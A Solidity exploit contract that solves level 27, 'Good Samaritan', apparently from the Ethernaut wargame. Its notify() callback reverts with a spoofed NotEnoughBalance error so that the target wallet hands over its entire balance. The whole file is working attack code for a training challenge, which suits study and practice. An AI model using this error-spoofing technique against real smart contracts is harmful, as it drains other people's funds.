// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 27. GOOD SAMARITAN
 * @dev Drain all the balance from the good samaritan wallet.
 */

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodOldSama {
    function coin() external returns (address);

    function wallet() external returns (address);

    function requestDonation() external returns (bool);
}

interface ICoin {
    function balances(address user) external view returns (uint256);
}

contract ThanksForTheNotif {
    IGoodOldSama private goodOldSama;
    ICoin private coin;
    address private wallet;

    error NotEnoughBalance();

    constructor(address _goodOldSama) {
        goodOldSama = IGoodOldSama(_goodOldSama);
        coin = ICoin(goodOldSama.coin());
        wallet = goodOldSama.wallet();
    }

    function notify(uint256 amount) public pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() public {
        goodOldSama.requestDonation();
        require(coin.balances(wallet) == 0, "Attack failed!");
    }
}
